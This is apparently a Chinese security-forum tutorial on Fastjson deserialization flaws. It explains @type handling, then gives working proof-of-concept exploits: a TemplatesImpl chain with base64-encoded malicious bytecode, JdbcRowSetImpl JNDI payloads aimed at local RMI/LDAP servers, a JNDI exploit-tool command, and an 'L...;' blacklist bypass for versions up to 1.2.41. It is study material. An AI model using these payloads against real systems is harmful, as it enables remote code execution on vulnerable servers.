# Java安全 - FastJson系列详解

> **来源**: https://forum.butian.net/share/2858  
> **文章ID**: 2858

---

Fastjson
========

简介
--

Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。

使用Fastjson进行序列化和反序列化
--------------------

‍

定义的一个学生类，其中包含两个属性及其getter/setter方法，还有类的构造函数

```java
public class Student {
    private String name;
    private int age;

    public Student() {
        System.out.println("构造函数");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }
}
```

调用JSON.toJsonString()来序列化Student类对象

```java
public class FJTest {
    public static void main(String[] args){

        Student student = new Student();
        student.setName("zjacky");
        student.setAge(20);
        String jsonstring = JSON.toJSONString(student); //, SerializerFeature.WriteClassName
        System.out.println(jsonstring);

    }
}
```

![image](images/attach-d8613a84175a1dcd88fccc4d49cdfd754e7a2bf1.png)​

反序列化

```java
public class FJTest {
    public static void main(String[] args){

        Student xiaoming = JSON.parseObject("{\"age\":20,\"name\":\"zzzjjjjaaaacccckkkkkyyyy\"}",Student.class);
        System.out.println("Name: "+xiaoming.getName());
        System.out.println("Age: "+xiaoming.getAge());

    }
}

```

![image](images/attach-55c31fba2e45a28de276dbd3e87cdfeb618a5fda.png)​

其实这里的反序列化也很简单，我的序列化字符串经过JSON.parseObject()处理后会实例化我的Student类然后触发了构造函数，然后以此调用了set方法来给我们这个对象当中的属性进行赋值也就是单纯一个反序列化他就会这么执行

![image](images/attach-c0673cbde76dfa3a17c450f725e3c90c00f71536.png)​

这就是fastjson的反序列化

‍

那么这里就存在一个问题了

![image](images/attach-285ae25fb5851f16ab549e0e6f4122a210506c22.png)​

其实很好理解，就是我要反序列化的类的属性名跟json的key对应的字段名是一样的 ，所以就可以用直接类的映射来填入即可，name 跟age是类的属性名，json字符串也是name跟age

‍

@type是什么？
---------

‍

![image](images/attach-f128a3e25752abd318845a26ee14b721ed21113a.png)​

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {

        String json = " {\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\" @type\":\"java.lang.Runtime\"}";
            ParserConfig.getGlobalInstance().addAccept("java.lang");
            Runtime runtime = (Runtime) JSON.parseObject(json,
                    Object.class);
            runtime.exec("calc.exe");

            }
    }
```

‍

![image](images/attach-28f6c5a77e596ae7e34f282d6f990977a733b51f.png)​

![image](images/attach-e691c4f4adb91536157ed0f88fc77c6821bbc5ee.png)​

‍

<span style="font-weight:bold;">SerializerFeature.WriteClassName(序列化)</span>
----------------------------------------------------------------------------------------

在序列化的时候oJSONString()还有一个参数 叫<span style="font-weight:bold;">SerializerFeature.WriteClassName </span>

SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。 Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作

![image](images/attach-34a8e095d86e1f256cb406025b79b22eb5ae442d.png)​

如图

```java
public class FJTest {
    public static void main(String[] args){

        Student student = new Student();
        student.setName("zjacky");
        student.setAge(20);
        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName); //
        System.out.println(jsonstring);

    }
}
```

![image](images/attach-67882b359fd628c75b274f56ac255c816283b334.png)​

‍

Feature.SupportNonPublicField(反序列化)
-----------------------------------

如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。

啥意思呢？其实就是说它能够获取到私有变量的值

比如写如下demo

这里的age和name都是私有的，我们能通过刚才上述的JSON.parseObject("{\\"age\\":20,\\"name\\":\\"zzzjjjjaaaacccckkkkkyyyy\\"}",Student.class); 这个反序列化能够得到age是因为存在setage这个方法进行了设置，如果这里我吧setage方法删掉 看下代码

```java
package fastjson;
public class Student {
    private String name;
    private int age;

    public Student() {
        System.out.println("构造函数");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

//    public void setAge(int age) {
//        System.out.println("setAge");
//        this.age = age;
//    }
}
```

这里再进行一次反序列化

```java
public class FJTest {
    public static void main(String[] args){

        Student xiaoming = JSON.parseObject("{\"age\":20,\"name\":\"zzzjjjjaaaacccckkkkkyyyy\"}",Student.class);
        System.out.println("Name: "+xiaoming.getName());
        System.out.println("Age: "+xiaoming.getAge());

    }
}

```

![image](images/attach-bcbfec8ca016b01786cf988d411335b11957654a.png)​

我们获取到的是 初始化的值 为0

但是这里我们加上 Feature.SupportNonPublicField 即可获得该私有变量

```java
package fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FJTest {
    public static void main(String[] args){

        Student xiaoming = JSON.parseObject("{\"age\":20,\"name\":\"zzzjjjjaaaacccckkkkkyyyy\"}",Student.class, Feature.SupportNonPublicField);
        System.out.println("Name: "+xiaoming.getName());
        System.out.println("Age: "+xiaoming.getAge());

    }
}
```

![image](images/attach-a4ffc9fe077b161b2638071484e6f0d00c5b4338.png)​

也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。

‍

反序列化时几种类型设置的比较
--------------

再来看下parseObject()的指定或不指定反序列化类型之间的差异

由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化

如下demo

Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法

```java
package fastjson;

public class Student {
    private String name;
    private int age;
    private String address;
    private String sex;

    public Student() {
        System.out.println("构造函数");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public String getAddress() {
        System.out.println("getAddress");
        return address;
    }

    public String getsex() {
        System.out.println("getsex");
        return sex;
    }
}
```

我序列化出来的值为

```java
{"@type":"fastjson.Student","age":20,"name":"zjacky","sex":"男"}
```

##### 未设置Feature.SupportNonPublicField

反序列化

```java
public class UnSerFJTest {
    public static void main(String[] args){

        String jsonstring = "{\"@type\":\"fastjson.Student\",\"age\":20,\"name\":\"zjacky\",\"sex\":\"男\"}";
        Object obj = JSON.parseObject(jsonstring, Student.class);
        System.out.println(obj);
        System.out.println(obj.getClass().getName());
    }
}
```

![image](images/attach-d4732f01e573afad8948177db20bc7f1a3f328fe.png)​

‍

##### 设置Feature.SupportNonPublicField

```java
public class UnSerFJTest {
    public static void main(String[] args){

        String jsonstring = "{\"@type\":\"fastjson.Student\",\"age\":20,\"name\":\"zjacky\",\"sex\":\"男\"}";
        Object obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);
        System.out.println(obj);
        System.out.println(obj.getClass().getName());
    }
}
```

输出，发现和未设置Feature.SupportNonPublicField的是一致的：

小结一下
----

根据前面的结果，有如下结论：

- 当反序列化为`JSON.parseObject(*)`​形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；
- 当反序列化为`JSON.parseObject(*,*.class)`​形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；
- 当反序列化为`JSON.parseObject(*)`​形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即`JSON.parseObject(*,*.class)`​形式得到的都是特定的Student类；

‍

parse与parseObject区别
-------------------

FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。

```java
//序列化
String text = JSON.toJSONString(obj); 

//反序列化
VO vo = JSON.parse();  //解析为JSONObject类型或者JSONArray类型
VO vo = JSON.parseObject("{...}");  //JSON文本解析成JSONObject类型
VO vo = JSON.parseObject("{...}", VO.class);  //JSON文本解析成VO.class类
```

可以推测出在反序列化过程中，会`parse()`​先调用@type标识的类的构造函数，然后再调用setter给对象赋值。

而parseObject()方法会同时调用所有的setter和getter

‍

漏洞原理
----

通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。

‍

getter setter条件
---------------

![image](images/attach-70fffb0743ab9aa5fad3cf9fcdaba2f92495ae91.png)​

‍

<span style="font-weight:bold;">如何才能够反序列化出恶意类呢</span>
-----------------------------------------------------------------

由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写`Object o = JSON.parseObject(poc,Object.class)`​就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。

‍

看如下案例 一个java bean类

```java
import java.io.IOException;

public class Calc {
    public String calc;

    public Calc() {
        System.out.println("调用了构造函数");
    }

    public String getCalc() {
        System.out.println("调用了getter");
        return calc;
    }

    public void setCalc(String calc) throws IOException {
        this.calc = calc;
        Runtime.getRuntime().exec("calc");
        System.out.println("调用了setter");
    }
}
```

序列化

```java
public class SerFJTest {
    public static void main(String[] args) throws IOException {
        Calc calc = new Calc();
        calc.setCalc("zjacky");
        String jsonstring = JSON.toJSONString(calc, SerializerFeature.WriteClassName); //
        System.out.println(jsonstring);
    }
}

//  {"@type":"fastjson.Calc","calc":"zjacky"}
```

反序列化

```java
import com.alibaba.fastjson.JSON;

public class Fastjson_Test {
    public static void main(String[] args) {
        String JSON_Calc = "{\"@type\":\"Calc\",\"calc\":\"Faster\"}";
        System.out.println(JSON.parseObject(JSON_Calc));
    }
}
```

![image](images/attach-1e86b8ef21710ba4ec0ac78e01b80324c8eb4b33.png)​

成功执行了setter中的恶意代码。因此，只要我们能找到一个合适的Java Bean，其setter或getter存在可控参数，则有可能造成任意命令执行。

‍

总结出一句话就是 fastjson他反序列化的时候会去找到@type这个指定类的全部属性的seter geter方法来进行自动调用，也就是说如果存在一个可控的指定类，以及这个指定类中存在可控的set get方法，就可以通过这个fastjson去调用set方法去达到任意命令执行

‍

参考

<https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E6%9C%AA%E8%AE%BE%E7%BD%AEFeature-SupportNonPublicField>

<https://goodapple.top/archives/832>

‍

‍

Fastjson各版本漏洞绕过分析
-----------------

### fastjson<=1.2.24

配置

```java

            com.alibaba
            fastjson
            1.2.23

```

在小于fastjson1.2.22-1.2.24版本中有两条利用链。

1. JNDI `com.sun.rowset.JdbcRowSetImpl`​
2. JDK7u21 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`​

#### TemplatesImpl链(JDK7u21)

条件苛刻

1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞：`JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)`​
2. 服务端使用parse()时，需要`JSON.parse(text1,Feature.SupportNonPublicField)`​

##### 漏洞静态分析

后半条链子是(CC3) JDK7u21 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`​

<https://blog.csdn.net/solitudi/article/details/119082164>

首先参考Y4的博客了解到 defineClass的使用

```java
public class TouchFile{

    public TouchFile() throws Exception {
        Runtime.getRuntime().exec("calc");
    }

}
```

存在一个构造方法，构造方法中存在命令执行

把它编译成字节码后再base64运行

```java
Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
byte[] code =Base64.getDecoder().decode("yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAGgwAGwAcAQAEY2FsYwwAHQAeAQAQb3JnL2V4YW1wbGUvVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAB0ABAAeAA0AHwALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQAAAAAgAR");
Class yyds= (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "Test", code, 0, code.length);
yyds.newInstance();
```

确实是可以弹出计算机的 (这里有点问题 之后在解决)

‍

也就是说如果能找到defineClass方法并且参数可控，那么就可以造成RCE了，那么于是乎这条链子的作者在`rt.jar`​中找到了defineClass

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass()`​

```java
Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
        }
```

但是在实际场景中，因为defineClass方法作用域却是不开放的(就是并不是public方法，所以需要找谁去调用了他)，所以我们很很难直接利用到它

所以我们要去找谁调用了这个`defineClass`​函数 ，于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses()`​

‍

![image](images/attach-db69bb9915b59e84ef2a07d8ef62a178dccf40f3.png)​

这里`_bytecodes`​ 不能为空

![image](images/attach-7ac277ae36feb19e6b8ef28733cd272a8a966880.png)​

‍

![image](images/attach-e5b492b1196414fe3cb169ac2bb66c7aab4159a8.png)​

‍

‍

这里会将我们的`_bytecodes`​加载进`_class`​这个当中，所以这里就要传我们的`_bytecodes`​

‍

在往上跟

于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance()`​

TemplatesImpl中`_bytecodes`​属性中存放着手工编写的字节码，并在其调用`getTransletInstance()`​方法时会加载该字节码到JVM中获取到字节码中的类并调用newInstance()创建该类的实例，如果`_bytecodes`​为可控的并且能找到一条触发getTransletInstance()方法的调用链，那么rce不就有了嘛。

‍

![image](images/attach-39599b9c1e79505629983d10746de36d1ef9965f.png)​

在这里 455 行里头会把\_class进行实例化从而会执行这个实例化所调用的静态方法和构造方法

当看完上述代码 你是否存在以下几个疑问？

1. `_class`​ 这玩意在451行的时候是为空才能进入，为啥后面455又有内容了呢？ ->因为根本没传`_class`​ 而是在451行通过`_bytecodes`​进行传入的
2. 455行会去进行强制类型转换为`AbstractTranslet`​类，那我们是不是要传该类进来呢？
3. 我的`_name`​不能为空啊，不然的话就会返回null

![image](images/attach-e5d96ea6cbb84d1701eaa881677ee1d0fd6bb2a5.png)​

‍

再往上跟

于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()`​

![image](images/attach-a33399772f51f6720c8df44079c868ae9a9f8202.png)​

再继续往上跟就找到了

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()`​

![image](images/attach-b3beab88b0d795b2d6a0c9d6365fdb64d418b724.png)​

‍

![image](images/attach-242fc330be13b039e506a6616825423b2eafd3e6.png)​

‍

```java
TemplatesImpl#getOutputProperties() ->
TemplatesImpl#newTransformer() ->
TemplatesImpl#getTransletInstance() ->
TemplatesImpl#defineTransletClasses() ->
TransletClassLoader#defineClass()
```

‍

这里其实还有一个疑问，那就是传入的get方法难道不是叫`get_outputProperties`​吗？

其实这里在fastjson中会有一个特殊的处理

![image](images/attach-ba9084e4eef293c8d69b01dfb146c00fb8eba9f6.png)​

‍

![image](images/attach-9908dc0b08ea78d8b6c9608c8579a416cfc5268b.png)​

![image](images/attach-bbfb722ab0165f01ff7fa9697474af3363f565f0.png)​

‍

![image](images/attach-4eaca31a4dda39ae104ee10a3360a59361910063.png)​

‍

整条TemplatesImpl链就跟完了

先贴出poc

```java
// Main.java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String evilCode_base64 = "yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwoABQAWBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB0BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAIAAkHAB8MACAAIQEABGNhbGMMACIAIwEAE29yZy9leGFtcGxlL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAGQAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAHAAIAB0ADAAAAAQAAQANAAEAFAAAAAIAFQ==";
                String payload =  "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\"" + evilCode_base64 + "\"],'_name':'asd','_tfactory':{ },\"_outputProperties\":{ }," + "\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";

        JSON.parse(payload, Feature.SupportNonPublicField);
    }
}

// Payload.java 把恶意类 将其编译为.class文件后进行base64编码即可
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Payload extends AbstractTranslet {

    public Payload() throws IOException{
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) throws IOException {
        Payload payload = new Payload();
    }
}
```

‍

‍

![image](images/attach-a4689857947a49ac4f78b2a64d72d68900828a67.png)​

##### 小结一下 TemplatesImpl 链

其实就是在fastjson的反序列化当中在autotype开启下，去寻找了templateslmpl这条链子，这条链子的一些初始化属性的get方法可以拼接到后续的jdk7u21的后半段链子当中然后通过defineClass来加载的恶意字节码来达到RCE的效果

‍

动态分析一下 在这里打下断点`com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze`​

![image](images/attach-f8de034f622b519118e5394bf20d6a4680dac530.png)​

在153行的地方将`_bytecodes`​的内容作为参数 传入`parseArray()`​中

![image](images/attach-1b7af7abce82b18ce59356a53f4505eb8d98d481.png)​

然后再这里调用了反序列化器进行反序列化

![image](images/attach-32a825ad5447245f222988f5449f1d9badead5e6.png)​

然后就会走到这个逻辑

![image](images/attach-386441d01c14545f7b201e5fb6ae0c3edcf510c4.png)​

重点就是这段代码

```java
byte[] bytes = lexer.bytesValue();
```

调用lexer.bytesValue获取bytes

这里对数据进行base64解码处理，将bytes数据返回。所以`_bytecodes`​需要进行base64编码。

![image](images/attach-bcbfec8ca016b01786cf988d411335b11957654a.png)​

然后后续就是链子了

![image](images/attach-386c2326cf1503351d2755671f13d5d19ab5602b.png)​

‍

‍

‍

‍

‍

##### 参考链接

- <https://forum.butian.net/share/1092>
- <https://www.cnblogs.com/akka1/p/16138460.html>
- <https://y4er.com/posts/fastjson-learn/>
- <https://www.cnblogs.com/nice0e3/p/14601670.html>\#

‍

#### <span style="font-weight:bold;">JdbcRowSetImpl链(JNDI)</span>

问题出在`JdbcRowSetImpl#setDataSourceName`​和`JdbcRowSetImpl#setAutoCommit`​方法中存在可控的参数

首先在`com.sun.rowset.JdbcRowSetImpl`​存在`setAutoCommit`​ 方法

![image](images/attach-84649a81ab7082ab5be229166bab7059100f944e.png)​

在this.conn为空的情况下会调用`this.connect();`​ 方法 跟进一下

![image](images/attach-f7818ab02430924d35a6cd517542aa4e6e723dfc.png)​

这个的话很明显的一个lookup函数配合JNDI

```java
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```

那只要保证`this.getDataSourceName() != null`​ 就可以触发这个JNDI了，所以建立一个小Demo

```java
package org.example;

import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/7nt2gi"
        );
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}
```

![image](images/attach-71fc08e292ea96788fedc1a77acea12cb8efcf96.png)​

这里的rmi是通过这个jndi利用工具起的

```bash
D:\Environment-Java\jdk1.8.0_65\bin\java.exe -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc"
```

‍

另一个函数就是`setDataSourceName`​

![image](images/attach-2312bda8d80c36207acdcd155c6b8c28b223646f.png)​

‍

他会调用父类的`setDataSourceName`​然后去设置`dataSource`​参数

![image](images/attach-0ef5415a610e084bbdeb9b3924c433dc50f722b8.png)​

而lookup函数的参数其实就是datasource这个参数

![image](images/attach-5c9db5a6306870d434b20ca62ae80f560a829095.png)​

但其实都是有限制的

在以下三种反序列化中均可使用，JDK版本限制和JNDI类似

##### RMI+JNDI

JDK版本为`JDK8u_65`​

```java
import com.alibaba.fastjson.JSON;

public class Fastjson_Jdbc_RMI {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```

‍

##### LDAP+JNDI

JDK版本为`JDK8u_181`​

```java
import com.alibaba.fastjson.JSON;

public class Fastjson_Jdbc_LDAP {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:9999/EXP\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```

![image](images/attach-3047c82230aa9b064dd25124b500638ec36ff4cd.png)​

‍

‍

### fastjson 1.2.25 - 1.2.41

‍

#### 黑白名单的绕过

在fastjson自爆1.2.24版本的反序列化漏洞后，1.2.25版本就加入了黑白名单机制

执行了上述代码后 会提示你`autoType is not support`​

![image](images/attach-9a70b23f571307ca7747dc2355ae96c460ab8601.png)​

我们可以查看 `com.alibaba.fastjson.parser.ParseConfig`​的源码可以看到加入了黑名单字眼

‍

![image](images/attach-85e52a3a641eb5e360bf9db07506918401d6911a.png)​

具体为

```xml
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload,org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss,org.mozilla.javascript
org.python.core
org.springframework
```

我们去看一下`checkAutoType()`​方法

‍

如果是`autoTypeSupport`​ 开启了为true 就会去将@type的类去匹配白名单，如果匹配到了白名单就用`TypeUtils.loadClass`​ 去加载这个类

![image](images/attach-a039c5c24d00b3424e0b4e6a6d0a3d8f36fc7dbc.png)​

然后如果不是白名单，就去匹配黑名单，匹配到了黑名单就会返回 `autoType is not support`​

![image](images/attach-617bf81b5505b2679708ef5217e0267a1301efc7.png)​

‍

如果没开`autoTypeSupport`​ 他就会先去匹配黑名单，是黑名单里头的就 `autoType is not support`​

![image](images/attach-4eafbab3667827fde50eaecf1436a669fe9d7ab7.png)​

如果匹配不到黑名单，那么就匹配白名单，存在就加载，不存在就说匹配不到

最后如果要反序列化的类和黑白名单都未匹配时，只有开启了autoType或者expectClass不为空也就是指定了Class对象时才会调用TypeUtils.loadClass加载，否则fastjson会默认禁止加载该类 <span style="font-weight:bold;">。</span>

![image](images/attach-27b3224a770b32927b0ff73c62253f453cc9f7b8.png)​

‍

我们跟进一下这里的<span style="font-weight:bold;">loadClass</span>方法

然后这里有一个很奇怪的写法导致了问题的产生，

![image](images/attach-94b8cddf79f8e2055df160781691c32d73df0d23.png)​

![image](images/attach-26cc6d8f0cff1ac9cd0f90fb8eef82fc8c126dd2.png)​

- 如果以`[`​开头则去掉`[`​后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）
- 如果以`L`​开头，以`;`​结尾，则去掉开头和结尾进行类加载
- ‍

所以在1.2.41之前就可以利用上述的处理机制来绕过黑白名单的限制

‍

![image](images/attach-34a8e095d86e1f256cb406025b79b22eb5ae442d.png)​

Fastjson默认AutoTypeSupport为`False`​（默认开启白名单机制），需要通过服务端使用以下代码手动关闭，这一点是高版本一个难以绕过的地方。

```java
ParserConfig.getGlobalInstance().addAccept("org.example.,org.javaweb.");
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.
在fastjson.properties中添加：
fastjson.parser.autoTypeAccept=org.example.

//只有是true了 才可以在不匹配黑白名单的情况下走到loadClass里头
```

那么其实也就很简单，只要以`L`​开头，以`;`​结尾就可以绕过了，这也就是<=1.2.41的绕过方式

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{" +
                "\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/nhdzhn\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}

```

![image](images/attach-984855867067597dede251518c5bc7d121e93f23.png)​

‍

### fastjson=1.2.42

1.2.42相较于之前的版本，关键是在`ParserConfig.java`​中修改了以下两点

- 黑名单改为了hash值，防止绕过
- 对于传入的类名，删除开头`L`​和结尾的`;`​

![image](images/attach-ccad02a12865102e1ad7cd50baf6d1592c5a3c6a.png)​

发现黑名单全是hash了

但是可以仔细查看这个check的逻辑

其实这里进行了一个加密的混淆 虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写`com.alibaba.fastjson.parser.ParserConfig#addDeny`​中的`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`​，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）

